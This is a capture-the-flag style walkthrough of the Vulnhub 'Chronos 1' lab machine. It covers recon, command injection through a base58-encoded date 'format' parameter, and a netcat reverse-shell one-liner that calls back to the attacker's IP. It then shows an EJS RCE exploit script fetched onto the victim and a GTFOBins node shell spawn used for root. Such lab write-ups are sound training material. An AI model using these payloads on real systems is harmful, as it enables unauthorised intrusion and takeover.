# Chronos 1 | Vulnhub | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [Chronos 1](https://www.vulnhub.com/entry/chronos-1,735/)              |
| Difficulty        | easy                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | nmap, Burp Suite, Gtfobins  |

# Reconnaissance
Let’s find the IP address of the machine

[arp-scan](../Vulnhub/images/chronos/image.png)

IP:- 10.0.2.20<br>
let’s scan the machines for ports and services<br>
`nmap -A -T4 <ip address>`

[Nmap Scan](../Vulnhub/images/chronos/image-1.png)

nmap results
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 80/tcp    | http          |
| 8000/tcp  | http          |

Let’s check out the webpage

[Webpage](../Vulnhub/images/chronos/image-2.png)

# Enumeration
Just a plain page!! 😕<br>
lets dig into its source code

[Source code](../Vulnhub/images/chronos/image-3.png)

ha!! found an hostname and URL.<br>
add the host into `/etc/hosts` file and then run the page again

[webpage_2](../Vulnhub/images/chronos/image-4.png)

let’s run the url we found in the source code

[webpage_3](../Vulnhub/images/chronos/image-5.png)

well if we run chronos.local OR chronos.local:8000 the page respondes with the time the page was visited, But when the URL from the source code is visited the page respondes with ‘Permission Denied’<br>
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL<br>
Let’s checkout the parameter ‘format’

[chiper decrypt](../Vulnhub/images/chronos/image-6.png)

[chiper decrypt](../Vulnhub/images/chronos/image-7.png)

Used a chiper identifier and decoder. the parameter is encoded with base58<br>
i did some browsing and found out that this is an argument for an linux command “date”.<br>

[Linux commands](../Vulnhub/images/chronos/image-8.png)

# Exploitation
so the webpage is running this code in its enviroment and then sending the result here<br>
let’s test for remote command injection using burp suite.
- Intercept chronos.local request and send it to the repeater
- send the request to make sure you have a status code 200
- next up edit the parameter from +today to +hello and then encode it in base58

[testing](../Vulnhub/images/chronos/image-9.png)

[burp suite testing](../Vulnhub/images/chronos/image-10.png)

as you can see the responsde has changed to hello, this means we can send a netcat reverse shell payload.

 
[Reverse Shell Cheat Sheet | Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) Get the Netcat payload from here
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP-address 1234 >/tmp/f
```
next up encoding the payload 

[cyber chef](../Vulnhub/images/chronos/image-11.png)

next set up a listner on you attack box `nc -lvp 4444` <br>
copy the encoded payload and paste it in the request and send it

[burp suite](../Vulnhub/images/chronos/image-12.png)

# Initial Access

There you have it reverse-shell !!<br>
the shell maybe unstable or slow
```
run python3 -c 'import pty;pty.spawn("/bin/bash")'
```

[Reverse shell](../Vulnhub/images/chronos/image-13.png)

# Privilege escalation

In `/opt` directory i found `chronos-v2` another webapp, digging deeper i found express-fileupload with an vulnerable version.<br>
it is vulnerable to RCE attack.

Found a [script](https://github.com/boiledsteak/EJS-Exploit/blob/main/attacker/EJS-RCE-attack.py) for the particular vulnerability
you can either download it directly into the victim or install it in your attack box and the wget it into the victim

[target files](../Vulnhub/images/chronos/image-14.png)

Once the exploit is installed.
edit it
[exploit.py](../Vulnhub/images/chronos/image-15.png)

Change the IP to the attacker box you are operating from
set up a listner and then run the exploit
```
python3 EJS-RCE-attack.py
```

[imera shell](../Vulnhub/images/chronos/image-16.png)

There you have it a second shell of user “imera”<br>

## Root Access Escalation
Lets check out the sudo rights of imera

[sudo -l](../Vulnhub/images/chronos/image-17.png)

imera has permission to run two programs npm and node
always check out GTFobins whenever you are going ahead with unix executable binaries<br>
Under node in GTFobins i found this:-
```
node -e ‘require(“child_process”).spawn(“/bin/sh”, {stdio: [0, 1, 2]})’
```

[GTFobins](../Vulnhub/images/chronos/image-18.png)

[root access](../Vulnhub/images/chronos/image-19.png)

<b>There you have it root access</b>

[user flag](../Vulnhub/images/chronos/image-21.png)

[root flag](../Vulnhub/images/chronos/image-20.png)

Root flag & User Flag found!<br>
Hope this Walkthrough was fun, easy to follow and helpful to you.<br>
Happy Hacking ~!!!
